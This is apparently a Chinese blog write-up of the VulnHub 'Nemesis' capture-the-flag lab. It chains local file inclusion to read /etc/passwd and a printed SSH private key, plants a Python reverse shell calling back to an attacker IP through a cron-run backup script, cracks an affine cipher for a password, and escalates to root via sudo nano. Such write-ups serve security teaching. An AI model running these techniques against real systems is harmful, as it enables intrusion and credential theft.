> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-3-UoPSKF0B4JremD0ocUw)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/1brjUjbpg5zGqnux86icY3iaSADXAreXiaJEIOOPug2W5Rich6Cst24vCeB65NNkoxowMh4uZIcwoSUKENv1mFW3ww/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

点击上方“信安前线” 可订阅

**0x01 介绍**

虚拟机页面：http://www.vulnhub.com/entry/ia-nemesis-101,582/

Description

```
`Difficulty: Intermediate to Hard``Goal: Get the root shell and read all the 3 flags.``Information: You need some good encryption and programming skills to root this box. Please solve this challenge by using only the intended way, any unintended way will not be apprecitated.``If you need any hints, you can contact us on Twitter (@infosecarticles)`
```

**0x02 Writeup**  

**服务探测：**

```
`PORT      STATE SERVICE VERSION``80/tcp    open  http    Apache httpd 2.4.38 ((Debian))``52845/tcp open  http    nginx 1.14.2``52846/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)``Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`
```

**web渗透测试：**

80端口服务有一个登录入口，在页面的validateForm函数中得到了用户名和密码，但是登录后没有任何东西。

```
`<!DOCTYPE html>``function validateForm() {` `var x = document.forms["myForm"]["uname"].value;` `var y = document.forms["myForm"]["pass"].value;``  if (x == "") {` `alert("Name must be filled out");` `return false;` `}` `if (y == "") {` `alert("Password must be filled out");` `return false;` `}` `if (x == "hacker_in_the_town" && y == "thanos")` `{` `document.write("You will be redirected to main page in 3 sec.");` `setTimeout('validate()', 3000);` `}``}`
```

紧接着访问52845端口，在#contact中尝试输入任意信息然后提交，出现提示Message has been saved in a file,于是在Message中输入/etc/passwd，成功实现了LFI。

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQQrFMEicbiaegFyNla6fGZ2JMeo7ZiaCr8PKibtrm0c03sd2aPkiczLkEyiauqThHrEWRxGHnWcA7GetKYA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQQrFMEicbiaegFyNla6fGZ2JM1GqRtHkZXVS6kIWZYl45561thNnz2hE4I3bxckaAvcHa2TgGDCKeEg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

之后，尝试了一些常见log读取失败后，尝试ssh登录thanos，发现需要私钥认证

```
`kali@kali:~$ ssh -p 52846 thanos@192.168.56.42` `thanos@192.168.56.42: Permission denied (publickey).`
```

尝试利用LFI获取thanos私钥/home/thanos/.ssh/id_rsa，成功并实现ssh登录，获取到**第一个flag**。

```
`-----BEGIN OPENSSH PRIVATE KEY-----``b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn``NhAAAAAwEAAQAAAQEA1H2rDU6AnY2LSnOSLpXxZ7Fb0HPfQQds2SdQzvBH6NNSIuLFsebl``2fAgeirNWD2LHs3C/8jPyy1GRsxFd9U0yF2hO0aRBASSWU+WzLTIeLvaPircn8P1l528cX``HoWvXnzKsZLibrFos6H3krrRJ8Y+U/BI8dPHVEc35j6z79kjZo9ywrCRFigsjnG/YnPfCi``ZwgxwUBHdJxyuugc9PiEMaDVGVL84gVNknR4INOLCCa8kSGoHfuW0+D67pDgtqzRup4io0``PurjeH9183JrSJe5Wa0aL7mz2aeaVRLS9ICCfmLp+Rp3nfGDolATqWpbtfvRUAbplL1R8N``VVyKFPkptQAAA8j/NR2S/zUdkgAAAAdzc2gtcnNhAAABAQDUfasNToCdjYtKc5IulfFnsV``vQc99BB2zZJ1DO8Efo01Ii4sWx5uXZ8CB6Ks1YPYsezcL/yM/LLUZGzEV31TTIXaE7RpEE``BJJZT5bMtMh4u9o+Ktyfw/WXnbxxceha9efMqxkuJusWizofeSutEnxj5T8Ejx08dURzfm``PrPv2SNmj3LCsJEWKCyOcb9ic98KJnCDHBQEd0nHK66Bz0+IQxoNUZUvziBU2SdHgg04sI``JryRIagd+5bT4PrukOC2rNG6niKjQ+6uN4f3XzcmtIl7lZrRovubPZp5pVEtL0gIJ+Yun5``Gned8YOiUBOpalu1+9FQBumUvVHw1VXIoU+Sm1AAAAAwEAAQAAAQEAkBkElYqF59IkAoIr``QNJIGfSJeewKGxRI+V4TC7KgYUBlM+kq/cDCYK/Zpl8+T7e0j1gkA8ePOo5iWQKPnXsFR1``dPTl5FWz8qa8xwTDPQuydREdWJNgLymjXKo/gGBSE7Z20kL0sPI4OZD9zhBIZDuo6s1I+k``2OoBWHz+j3pxBOQKmApkbtwkKSli75xuzYaDt/OMy8/t+ML5ocTXSqJ4p00uH231OLCwKK``Ek5u1mrJQ07SYIK7g1pr1nwru9eMf4lKcT4KKPvPmaNorooYo86QO9bQk61DCjMEdh0uI7``hwUd5welBALIhUU3JFBznj7Xo8WnK0JFOJD2qAJQrFtz4QAAAIBJPdwoMasCzCOdLtkbC+``DPFhHH1cJ/kPUusNMV03xkOk0XjsZ06gwnvWQSTp0bE+zC8YmKCj23bNP/XDBhAogmVTqw``S4a+lO5gJutRT2rFSYBc58NIH3A4/IPKLbqy1+8+WuIce98eHsUliiTpcDwv5JYUkWHjCx``CKtfPIcrW8YAAAAIEA7dSwRfEti3jd/Prm/zfb1sbkwpo6oiLCum3E9fLIi0iWmqUFcTvd``xbh5xOweywAUs/jYpPw3pK3ZIwQC8tGbHKNVDPtXBSk+5qTRZv5FvAZTH9xiQeSGNiPPMi``FWOc1CpeNywEDY/k43wyIQSIeXjR1z8ZxFkf8u/l4poFE2eX0AAACBAOS5ZqSQ9cbv8Rm2``zIUmIQvBvG0cegsKaDx4ZMK0I2J3kLKM+qWbQbSxVWt/NOHMQGfrDD2MIX61fN7JjqL4E0``KzmgYQleQRM3U3RGpynnimPBzd3NmvpVxBFb3wg/U9rIlrGzzUkwQZRtntox6k3jka8oHd``U5RDT6RIBqdYiiaZAAAADnRoYW5vc0BuZW1lc2lzAQIDBA==``-----END OPENSSH PRIVATE KEY-----`
```

```
`kali@kali:~$ ssh -p 52846 -i id thanos@192.168.56.42` `Linux nemesis 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64``The programs included with the Debian GNU/Linux system are free software;``the exact distribution terms for each program are described in the``individual files in /usr/share/doc/*/copyright.``Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent``permitted by applicable law.``Last login: Mon Oct 26 08:48:39 2020 from 127.0.0.1``thanos@nemesis:~$ ls -all``total 40``drwxr-xr-x 4 thanos thanos 4096 Oct 25 10:05 .``drwxr-xr-x 4 root   root   4096 Oct  6 15:17 ..``-rw-r--r-- 1 carlos carlos  345 Oct  3 22:22 backup.py``-rw------- 1 thanos thanos 1065 Oct 26 09:11 .bash_history``-rw-r--r-- 1 thanos thanos  220 Oct  6 15:17 .bash_logout``-rw-r--r-- 1 thanos thanos 3526 Oct  6 15:17 .bashrc``-rw-r--r-- 1 thanos thanos  800 Oct  6 16:35 flag1.txt``drwxr-xr-x 3 thanos thanos 4096 Oct  7 18:04 .local``-rw-r--r-- 1 thanos thanos  807 Oct  6 15:17 .profile``drwxr-xr-x 2 thanos thanos 4096 Oct 26 09:10 .ssh``thanos@nemesis:~$ cat flag1.txt`  `_.-'|` `_.-'    |` `_.-'        |` `.-'____________|______` `|                     |` `| Congratulations for |` `|  pwning user Thanos |` `|                     |` `|      _______        |` `|     |.-----.|       |` `|     ||x . x||       |` `|     ||_.-._||       |` ``|     `--)-(--`       |`` `|    __[=== o]___     |` `|   |:::::::::::|\    |` ``|   `-=========-`()   |`` `|                     |` `|  Flag{LF1_is_R34L}  |` `|                     |` `|    -= Nemesis =-    |` `` `---------------------` ``
```

**获取第二个flag：**

在用户目录下发现一个属于carlos的文件backup.py,同时观察到/tmp/website.zip每分钟被carlos用户生成-rw-r--r-- 1 carlos carlos 1011946 Oct 27 07:46 website.zip，由此可以判断该用户每分钟在执行python /home/thanos/backup.py。

```
`thanos@nemesis:~$ ls -all``total 40``drwxr-xr-x 4 thanos thanos 4096 Oct 25 10:05 .``drwxr-xr-x 4 root   root   4096 Oct  6 15:17 ..``-rw-r--r-- 1 carlos carlos  345 Oct  3 22:22 backup.py``-rw------- 1 thanos thanos 1065 Oct 26 09:11 .bash_history``-rw-r--r-- 1 thanos thanos  220 Oct  6 15:17 .bash_logout``-rw-r--r-- 1 thanos thanos 3526 Oct  6 15:17 .bashrc``-rw-r--r-- 1 thanos thanos  800 Oct  6 16:35 flag1.txt``drwxr-xr-x 3 thanos thanos 4096 Oct  7 18:04 .local``-rw-r--r-- 1 thanos thanos  807 Oct  6 15:17 .profile``drwxr-xr-x 2 thanos thanos 4096 Oct 26 09:10 .ssh``#!/usr/bin/env python``import os``import zipfile``def zipdir(path, ziph):` `for root, dirs, files in os.walk(path):` `for file in files:` `ziph.write(os.path.join(root, file))``if __name__ == '__main__':` `zipf = zipfile.ZipFile('/tmp/website.zip', 'w', zipfile.ZIP_DEFLATED)` `zipdir('/var/www/html', zipf)` `zipf.close()``thanos@nemesis:~$ cat backup.py` `#!/usr/bin/env python``import os``import zipfile``def zipdir(path, ziph):` `for root, dirs, files in os.walk(path):` `for file in files:` `ziph.write(os.path.join(root, file))``if __name__ == '__main__':` `zipf = zipfile.ZipFile('/tmp/website.zip', 'w', zipfile.ZIP_DEFLATED)` `zipdir('/var/www/html', zipf)` `zipf.close()`
```

于是，替换backup.py为反弹shell（需要注意的是不能直接编辑backup.py，需要将原backup.py重名为其它文件，再重新生成backup.py）。

```
`thanos@nemesis:~$ cat backup.py` `import socket``import subprocess``import os``s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)``s.connect(("192.168.56.4",8000))``os.dup2(s.fileno(),0)``os.dup2(s.fileno(),1)``os.dup2(s.fileno(),2)``p=subprocess.call(["/bin/sh","-i"])`
```

成功获取第二个flag。

```
`kali@kali:~$ rlwrap nc -lp 8000` `/bin/sh: 0: can't access tty; job control turned off``$ id``uid=1000(carlos) gid=1000(carlos) groups=1000(carlos),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)``$ cd /home/carlos``$ ls -all``total 40``drwxr-x--- 3 carlos carlos 4096 Oct  7 17:55 .``drwxr-xr-x 4 root   root   4096 Oct  6 15:17 ..``-rw------- 1 carlos carlos    8 Oct 25 10:04 .bash_history``-rw-r--r-- 1 carlos carlos  220 Oct  6 15:05 .bash_logout``-rw-r--r-- 1 carlos carlos 3526 Oct  6 15:05 .bashrc``-rw-r--r-- 1 carlos carlos  886 Oct  5 21:09 encrypt.py``-rw-r--r-- 1 carlos carlos  801 Oct  7 16:59 flag2.txt``drwxr-xr-x 3 carlos carlos 4096 Oct  7 16:58 .local``-rw-r--r-- 1 carlos carlos  807 Oct  6 15:05 .profile``-rw-r--r-- 1 carlos carlos  279 Oct  7 17:52 root.txt``$ cat flag2.txt` `_.-'|` `_.-'    |` `_.-'        |` `.-'____________|______` `|                     |` `| Congratulations for |` `|  pwning user Carlos |` `|                     |` `|      _______        |` `|     |.-----.|       |` `|     ||x . x||       |` `|     ||_.-._||       |` ``|     `--)-(--`       |`` `|    __[=== o]___     |` `|   |:::::::::::|\    |` ``|   `-=========-`()   |`` `|                     |` `| Flag{PYTHON_is_FUN} |` `|                     |` `|    -= Nemesis =-    |` `` `---------------------` ``
```

**提权至root获取第三个flag：**

用户文件下root.txt

```
`The password for user Carlos has been encrypted using some algorithm and the code used to encrpyt the password is stored in “encrypt.py”. You need to find your way to hack the encryption algorithm and get the password. The password format is “****FUN”``Good Luck!`
```

分析encrypt.py。

```
`def egcd(a, b):` `x,y, u,v = 0,1, 1,0` `while a != 0:` `q, r = b//a, b%a` `m, n = x-u*q, y-v*q` `b,a, x,y, u,v = a,r, u,v, m,n` `gcd = b` `return gcd, x, y``def modinv(a, m):` `gcd, x, y = egcd(a, m)` `if gcd != 1:` `return None` `else:` `return x % m``def affine_encrypt(text, key):` `return ''.join([ chr((( key[0]*(ord(t) - ord('A')) + key[1] ) % 26)` `+ ord('A')) for t in text.upper().replace(' ', '') ])``def affine_decrypt(cipher, key):` `return ''.join([ chr((( modinv(key[0], 26)*(ord(c) - ord('A') - key[1]))` `% 26) + ord('A')) for c in cipher ])``def main():` `text = 'REDACTED'` `affine_encrypted_text="FAJSRWOXLAXDQZAWNDDVLSU"` `key = [REDACTED,REDACTED]` `print('Decrypted Text: {}'.format` `( affine_decrypt(affine_encrypted_text, key) ))``if __name__ == '__main__':` `main()`
```

FUN对应密文QZA首先确定key[0], key[1]

```
`import sys``def affine_encrypt(text, key):` `return ''.join([ chr((( key[0]*(ord(t) - ord('A')) + key[1] ) % 26)` `+ ord('A')) for t in text.upper().replace(' ', '') ])``if __name__ == '__main__':  ``    affine_text="FUN"` `for key0 in range(65, 91):` `for key1 in range(65, 91):` `encrypt_text = affine_encrypt(affine_text, [key0, key1])` `if encrypt_text == "QZA":` `print(key0,key1)` `sys.exit(0)`
```

得到key为[89, 65],解密过程就是加密的反向过程，解密程序如下：

```
`def affine_decrypt(cipher):` `text = []` `for t in cipher:` `b = ord(t) - ord('A')` `for x in range(0, 26):` `result = (65 + x*89 - b) % 26` `if result == 0:` `text.append(chr(x + ord('A')))` `break` `print(''.join(text))` `if __name__ == '__main__':  ``    affine_encrypted_text = "FAJSRWOXLAXDQZAWNDDVLSU"` `affine_decrypt(affine_encrypted_text)`
```

得到password为ENCRYPTIONISFUNPASSWORD

查看sudo -l

```
`carlos@nemesis:~$ sudo -l``[sudo] password for carlos:` `Matching Defaults entries for carlos on nemesis:` `env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin``User carlos may run the following commands on nemesis:` `(root) /bin/nano /opt/priv`
```

剩下的就很容易了，用nano提权。

```
 `,----------------,              ,---------,` `,-----------------------,          ,"        ,"|` `,"                      ,"|        ,"        ,"  |` `+-----------------------+  |      ,"        ,"    |` `|  .-----------------.  |  |     +---------+      |` `|  |                 |  |  |     | -==----'|      |` `|  |  I LOVE Linux!  |  |  |     |         |      |` ``|  |                 |  |  |/----|`---=    |      |`` `|  | root@nemesis:~# |  |  |   ,/|==== ooo |      ;` `|  |                 |  |  |  // |(((( [33]|    ,"` ``|  `-----------------'  |," .;'| |((((     |  ,"`` `+-----------------------+  ;;  | |         |,"``        /_)______________(_/  //'   | +---------+` ``___________________________/___  `,`` `/  oooooooooooooooo  .o.  oooo /,   \,"-----------` ``/ ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"```/_==__==========__==_ooo__ooo=_/'   /___________,"``` `-----------------------------'```FLAG{CTFs_ARE_AW3S0M3}``Congratulations for getting root on Nemesis! We hope you enjoyed this CTF!``Share this Flag on Twitter (@infosecarticles). Cheers!``Follow our blog at https://www.infosecarticles.com``Made by CyberBot and 0xMadhav!`
```

**PS：已授权，感谢大哥的文章**

更多精彩

*   [Web渗透技术初级课程介绍](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486030&idx=2&sn=185f303a2f1b5267c0865f117931959d&chksm=fcfc3718cb8bbe0e6f3ca97859e78342852537da2bef3cd76a83cb90ee64a8ca8953b35aa67e&scene=21#wechat_redirect)
    
*   [](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486030&idx=2&sn=185f303a2f1b5267c0865f117931959d&chksm=fcfc3718cb8bbe0e6f3ca97859e78342852537da2bef3cd76a83cb90ee64a8ca8953b35aa67e&scene=21#wechat_redirect)[Web漏扫软件Appscan 最新 V10.0.4原版包下载](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486869&idx=1&sn=abbd0f6c337a0dfe920a0e9d01c7a96a&chksm=fcfc30c3cb8bb9d536cb7d018f390c052deeef25191c1292c27aa3c53445ab6e838adf6143a5&scene=21#wechat_redirect)
    
*   [商务合作](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486808&idx=1&sn=f50f15f9a3ab7312a08b1f932292faca&chksm=fcfc300ecb8bb918213c6070d864ffcd70ad27ab6525521c31e9ccaa57bdfa2968360ed7e8fe&scene=21#wechat_redirect)
    

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**如果感觉文章不错，分享让更多的人知道吧！**